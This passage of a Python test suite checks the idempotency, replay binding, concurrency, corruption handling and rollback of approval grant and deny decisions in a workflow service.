    assert service.run_ready_steps(run.workflow_run_id).state == "succeeded"
    alternate = _revision(
        (
            _node(
                "step_gate",
                WorkflowNodeType.APPROVAL,
                approval_gate_id=GATE.approval_gate_id,
            ),
        ),
        (),
        revision_id="wrev_projection_changed",
        version="1.0.1",
    )
    service.register(_definition(), alternate, actor_id=ACTOR, approval_gates=(GATE,))
    _append_run_head(root, run.workflow_run_id, revision_id=alternate.revision_id)

    with pytest.raises(WorkflowError, match=r"binding|idempotency|receipt"):
        service.grant_approval(
            run.workflow_run_id,
            "step_gate",
            approval_id=approval.approval_id,
            actor_id=ACTOR,
            idempotency_key=decision_key,
            at=DECISION_WAIT_STARTED + timedelta(seconds=3),
        )

    assert first.state == "running"
    assert len(_decision_events(root, run.workflow_run_id)) == 1


@pytest.mark.parametrize(
    "field",
    [
        "workflow_run_id",
        "step_run_ids",
        "replay_of_run_id",
        "started_at",
        "schema_version",
        "id_scheme_version",
        "extensions",
    ],
)
def test_workflow_grant_replay_rejects_changed_immutable_run_projection(
    tmp_path: Path, field: str
) -> None:
    root = make_platform_workspace(tmp_path / field)
    service, run, approval = _waiting_approval(root, start_key=f"decision_run_projection_{field}")
    decision_key = f"decision_run_projection_exact_{field}"
    service.grant_approval(
        run.workflow_run_id,
        "step_gate",
        approval_id=approval.approval_id,
        actor_id=ACTOR,
        idempotency_key=decision_key,
        at=DECISION_WAIT_STARTED + timedelta(seconds=2),
    )
    assert service.run_ready_steps(run.workflow_run_id).state == "succeeded"
    updates: dict[str, Any] = {
        "workflow_run_id": {"workflow_run_id": "wrun_projection_changed"},
        "step_run_ids": {"step_run_ids": run.step_run_ids + run.step_run_ids},
        "replay_of_run_id": {"replay_of_run_id": "wrun_projection_origin"},
        "started_at": {"started_at": run.started_at + timedelta(seconds=1)},
        "schema_version": {"schema_version": "1.5.0"},
        "id_scheme_version": {"id_scheme_version": "2"},
        "extensions": {"extensions": {"projection": "changed"}},
    }[field]
    _append_run_head(root, run.workflow_run_id, **updates)

    with pytest.raises(WorkflowError, match=r"binding|idempotency|receipt|step"):
        service.grant_approval(
            run.workflow_run_id,
            "step_gate",
            approval_id=approval.approval_id,
            actor_id=ACTOR,
            idempotency_key=decision_key,
            at=DECISION_WAIT_STARTED + timedelta(seconds=3),
        )


def test_workflow_grant_replay_accepts_real_state_and_completion_progression(
    tmp_path: Path,
) -> None:
    root = make_platform_workspace(tmp_path)
    service, run, approval = _waiting_approval(root, start_key="decision_run_progression")
    decision_key = "decision_run_progression_exact"
    first = service.grant_approval(
        run.workflow_run_id,
        "step_gate",
        approval_id=approval.approval_id,
        actor_id=ACTOR,
        idempotency_key=decision_key,
        at=DECISION_WAIT_STARTED + timedelta(seconds=2),
    )
    progressed = service.run_ready_steps(
        run.workflow_run_id,
        at=DECISION_WAIT_STARTED + timedelta(seconds=3),
    )

    replay = service.grant_approval(
        run.workflow_run_id,
        "step_gate",
        approval_id=approval.approval_id,
        actor_id=ACTOR,
        idempotency_key=decision_key,
        at=DECISION_WAIT_STARTED + timedelta(seconds=4),
    )

    assert progressed.state == "succeeded"
    assert progressed.completed_at == DECISION_WAIT_STARTED + timedelta(seconds=3)
    assert replay == first


@pytest.mark.parametrize("decision", ["grant", "deny"])
def test_concurrent_exact_workflow_decisions_commit_one_transition_and_receipt(
    tmp_path: Path, decision: str
) -> None:
    root = make_platform_workspace(tmp_path / decision)
    _, run, approval = _waiting_approval(root, start_key=f"decision_concurrent_{decision}")
    expected = _pending_binding(
        root,
        run.workflow_run_id,
        at=DECISION_WAIT_STARTED + timedelta(seconds=1),
    )

    def _decide(_: int) -> WorkflowRun:
        service = WorkflowService(root)
        if decision == "grant":
            return service.grant_approval(
                run.workflow_run_id,
                "step_gate",
                approval_id=approval.approval_id,
                actor_id=ACTOR,
                idempotency_key=f"decision_concurrent_exact_{decision}",
                at=DECISION_WAIT_STARTED + timedelta(seconds=2),
            )
        return service.deny_approval(
            run.workflow_run_id,
            "step_gate",
            expected=expected,
            actor_id=ACTOR,
            idempotency_key=f"decision_concurrent_exact_{decision}",
            at=DECISION_WAIT_STARTED + timedelta(seconds=2),
        )

    with ThreadPoolExecutor(max_workers=8) as executor:
        results = tuple(executor.map(_decide, range(16)))

    assert all(result == results[0] for result in results)
    assert len(_decision_events(root, run.workflow_run_id)) == 1
    assert _decision_receipt_count(root) == 1


def test_workflow_decision_key_cannot_rebind_or_manufacture_terminal_success(
    tmp_path: Path,
) -> None:
    root = make_platform_workspace(tmp_path)
    service, run, approval = _waiting_approval(root, start_key="decision_binding")
    decision_key = "decision_binding_exact"
    expected = _pending_binding(
        root,
        run.workflow_run_id,
        at=DECISION_WAIT_STARTED + timedelta(seconds=1),
    )
    service.grant_approval(
        run.workflow_run_id,
        "step_gate",
        approval_id=approval.approval_id,
        actor_id=ACTOR,
        idempotency_key=decision_key,
        at=DECISION_WAIT_STARTED + timedelta(seconds=2),
    )

    with pytest.raises(WorkflowError, match="idempotency"):
        service.grant_approval(
            run.workflow_run_id,
            "step_gate",
            approval_id=approval.approval_id,
            actor_id="user_other_actor",
            idempotency_key=decision_key,
            at=DECISION_WAIT_STARTED + timedelta(seconds=3),
        )
    with pytest.raises(WorkflowError, match="idempotency"):
        service.grant_approval(
            run.workflow_run_id,
            "step_gate",
            approval_id="apr_changed",
            actor_id=ACTOR,
            idempotency_key=decision_key,
            at=DECISION_WAIT_STARTED + timedelta(seconds=3),
        )
    with pytest.raises(WorkflowError, match="idempotency"):
        service.deny_approval(
            run.workflow_run_id,
            "step_gate",
            expected=expected,
            actor_id=ACTOR,
            idempotency_key=decision_key,
            at=DECISION_WAIT_STARTED + timedelta(seconds=3),
        )
    with pytest.raises(WorkflowError, match="waiting"):
        service.grant_approval(
            run.workflow_run_id,
            "step_gate",
            approval_id=approval.approval_id,
            actor_id=ACTOR,
            idempotency_key="decision_binding_changed_key",
            at=DECISION_WAIT_STARTED + timedelta(seconds=3),
        )

    _, other_run, other_approval = _waiting_approval(
        root,
        start_key="decision_binding_other_run",
        inputs={"seed": "other"},
    )
    with pytest.raises(WorkflowError, match="idempotency"):
        service.grant_approval(
            other_run.workflow_run_id,
            "step_gate",
            approval_id=other_approval.approval_id,
            actor_id=ACTOR,
            idempotency_key=decision_key,
            at=DECISION_WAIT_STARTED + timedelta(seconds=3),
        )
    with pytest.raises(WorkflowError, match="node"):
        service.grant_approval(
            run.workflow_run_id,
            "step_other",
            approval_id=approval.approval_id,
            actor_id=ACTOR,
            idempotency_key=decision_key,
            at=DECISION_WAIT_STARTED + timedelta(seconds=3),
        )

    assert len(_decision_events(root, run.workflow_run_id)) == 1
    assert _decision_receipt_count(root) == 1
    assert _step_head(root, other_run.step_run_ids[0]).state == "waiting"


@pytest.mark.parametrize(
    "changed_binding",
    [
        "run_input",
        "step_id",
        "gate_id",
        "gate_action",
        "gate_role",
        "policy_sha256",
        "policy_version",
        "gate_expiry",
    ],
)
def test_workflow_decision_replay_rejects_changed_persisted_binding(
    tmp_path: Path, changed_binding: str
) -> None:
    root = make_platform_workspace(tmp_path / changed_binding)
    service, run, approval = _waiting_approval(
        root, start_key=f"decision_persisted_{changed_binding}"
    )
    decision_key = f"decision_persisted_replay_{changed_binding}"
    service.grant_approval(
        run.workflow_run_id,
        "step_gate",
        approval_id=approval.approval_id,
        actor_id=ACTOR,
        idempotency_key=decision_key,
        at=DECISION_WAIT_STARTED + timedelta(seconds=2),
    )

    if changed_binding == "run_input":
        with initialize_platform_store(root) as store:
            record = store.head("workflow_run", run.workflow_run_id)
            assert record is not None
            payload = dict(record.payload)
        payload["inputs"] = {"seed": "changed"}
        _rewrite_head_payload(root, "workflow_run", run.workflow_run_id, payload)
    elif changed_binding == "step_id":
        with initialize_platform_store(root) as store:
            record = store.head("workflow_step", run.step_run_ids[0])
            assert record is not None
            payload = dict(record.payload)
        payload["step_run_id"] = "wstep_changed_binding"
        _rewrite_head_payload(root, "workflow_step", run.step_run_ids[0], payload)
    else:
        with initialize_platform_store(root) as store:
            record = store.head("workflow_approval_gate", GATE.approval_gate_id)
            assert record is not None
            payload = dict(record.payload)
        updates: dict[str, Any] = {
            "gate_id": {"approval_gate_id": "wgate_changed_binding"},
            "gate_action": {"action": "workflow_other_action"},
            "gate_role": {"required_role": "role_reviewer"},
            "policy_sha256": {"scope_sha256": "d" * 64},
            "policy_version": {"schema_version": "1.5.0"},
            "gate_expiry": {"expires_after_seconds": GATE.expires_after_seconds + 1},
        }[changed_binding]
        payload.update(updates)
        _rewrite_head_payload(
            root,
            "workflow_approval_gate",
            GATE.approval_gate_id,
            payload,
        )

    with pytest.raises(WorkflowError, match=r"binding|gate|idempotency|receipt"):
        WorkflowService(root).grant_approval(
            run.workflow_run_id,
            "step_gate",
            approval_id=approval.approval_id,
            actor_id=ACTOR,
            idempotency_key=decision_key,
            at=DECISION_WAIT_STARTED + timedelta(seconds=3),
        )

    assert len(_decision_events(root, run.workflow_run_id)) == 1


@pytest.mark.parametrize("corruption", ["receipt", "event", "missing_receipt"])
def test_workflow_decision_replay_fails_closed_on_orphan_or_corruption(
    tmp_path: Path, corruption: str
) -> None:
    root = make_platform_workspace(tmp_path / corruption)
    service, run, approval = _waiting_approval(root, start_key=f"decision_{corruption}")
    decision_key = f"decision_corruption_{corruption}"
    service.grant_approval(
        run.workflow_run_id,
        "step_gate",
        approval_id=approval.approval_id,
        actor_id=ACTOR,
        idempotency_key=decision_key,
        at=DECISION_WAIT_STARTED + timedelta(seconds=2),
    )
    with initialize_platform_store(root) as store, store.transaction():
        if corruption == "receipt":
            store.connection.execute(
                "UPDATE idempotency_receipts SET receipt_json='{}' "
                "WHERE scope='workflow_approval_decision' AND idempotency_key=?",
                (decision_key,),
            )
        elif corruption == "event":
            store.connection.execute(
                "DELETE FROM audit_events WHERE stream_id=? "
                "AND event_type='workflow_approval_granted'",
                (run.workflow_run_id,),
            )
        else:
            store.connection.execute(
                "DELETE FROM idempotency_receipts "
                "WHERE scope='workflow_approval_decision' AND idempotency_key=?",
                (decision_key,),
            )

    error = "waiting" if corruption == "missing_receipt" else "receipt"
    with pytest.raises(WorkflowError, match=error):
        WorkflowService(root).grant_approval(
            run.workflow_run_id,
            "step_gate",
            approval_id=approval.approval_id,
            actor_id=ACTOR,
            idempotency_key=decision_key,
            at=DECISION_WAIT_STARTED + timedelta(seconds=3),
        )


@pytest.mark.parametrize("decision", ["grant", "deny"])
def test_workflow_decision_receipt_event_and_transition_roll_back_together(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    decision: str,
) -> None:
    root = make_platform_workspace(tmp_path / decision)
    service, run, approval = _waiting_approval(root, start_key=f"decision_rollback_{decision}")
    expected = _pending_binding(
        root,
        run.workflow_run_id,
        at=DECISION_WAIT_STARTED + timedelta(seconds=1),
    )
    original = PlatformStore.idempotent_receipt

    class SimulatedCrash(RuntimeError):
        pass

    def _crash_after_receipt(
        self: PlatformStore,
        *,
        scope: str,
        idempotency_key: str,
        request: dict[str, Any],
        receipt: dict[str, Any] | None = None,
    ) -> dict[str, Any] | None:
        result = original(
            self,
            scope=scope,
            idempotency_key=idempotency_key,
            request=request,
            receipt=receipt,
        )
        if scope == "workflow_approval_decision" and receipt is not None:
            raise SimulatedCrash("crash after decision receipt")
        return result

    with monkeypatch.context() as patch:
        patch.setattr(PlatformStore, "idempotent_receipt", _crash_after_receipt)
        with pytest.raises(SimulatedCrash):
            if decision == "grant":
                service.grant_approval(
                    run.workflow_run_id,
                    "step_gate",
                    approval_id=approval.approval_id,
                    actor_id=ACTOR,
                    idempotency_key=f"decision_rollback_exact_{decision}",
                    at=DECISION_WAIT_STARTED + timedelta(seconds=2),
                )
            else:
                service.deny_approval(
                    run.workflow_run_id,
                    "step_gate",
                    expected=expected,
                    actor_id=ACTOR,
                    idempotency_key=f"decision_rollback_exact_{decision}",
                    at=DECISION_WAIT_STARTED + timedelta(seconds=2),
                )

    step = _step_head(root, run.step_run_ids[0])
    assert step.state == "waiting"
    assert WorkflowService(root).snapshot()["runs"][0]["state"] == "running"
    assert _decision_events(root, run.workflow_run_id) == ()
    assert _decision_receipt_count(root) == 0


def test_deny_default_time_is_sampled_after_writer_lock(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    root = make_platform_workspace(tmp_path)
    service, revision = _registered(
        root,
        (
            _node(
                "step_gate",
                WorkflowNodeType.APPROVAL,
                approval_gate_id=GATE.approval_gate_id,
            ),
        ),
        (),
        approval_gates=(GATE,),
    )
    run = _start(service, revision)
    service.run_ready_steps(run.workflow_run_id)
    expected = _pending_binding(root, run.workflow_run_id)
    transaction_attempted = Event()
    test_thread = get_ident()
    original_transaction = PlatformStore.transaction

    @contextmanager
    def _observed_transaction(self: PlatformStore) -> Any:
        if get_ident() != test_thread:
            transaction_attempted.set()
        with original_transaction(self):
            yield

    monkeypatch.setattr(PlatformStore, "transaction", _observed_transaction)
    with ThreadPoolExecutor(max_workers=1) as executor, initialize_platform_store(root) as blocker:
        with blocker.transaction():
            result = executor.submit(
                service.deny_approval,
                run.workflow_run_id,
                "step_gate",
                expected=expected,
                actor_id=ACTOR,
                idempotency_key="decision_deny_lock_time",
            )
            assert transaction_attempted.wait(timeout=1)
            time.sleep(0.05)
            release_boundary = datetime.now(UTC)
        denied = result.result(timeout=5)

    assert denied.completed_at is not None
    assert denied.completed_at >= release_boundary


@pytest.mark.parametrize("decision", ["grant", "deny"])
def test_workflow_decisions_require_exact_nonempty_key_and_aware_time(
    tmp_path: Path, decision: str
) -> None:
    root = make_platform_workspace(tmp_path / decision)
    service, run, approval = _waiting_approval(root, start_key=f"decision_input_{decision}")
    kwargs: dict[str, Any] = {
        "actor_id": ACTOR,
        "idempotency_key": "",
        "at": datetime(2040, 2, 3, 4, 5, 8),
    }
    if decision == "grant":
        kwargs["approval_id"] = approval.approval_id
    else:
        kwargs["expected"] = _pending_binding(
            root,
            run.workflow_run_id,
            at=DECISION_WAIT_STARTED + timedelta(seconds=1),
        )
    operation = service.grant_approval if decision == "grant" else service.deny_approval

    with pytest.raises(WorkflowError, match="idempotency"):
        operation(run.workflow_run_id, "step_gate", **kwargs)
    kwargs["idempotency_key"] = f"decision_input_exact_{decision}"
    with pytest.raises(WorkflowError, match="timezone"):
        operation(run.workflow_run_id, "step_gate", **kwargs)

    assert _step_head(root, run.step_run_ids[0]).state == "waiting"
    assert _decision_receipt_count(root) == 0
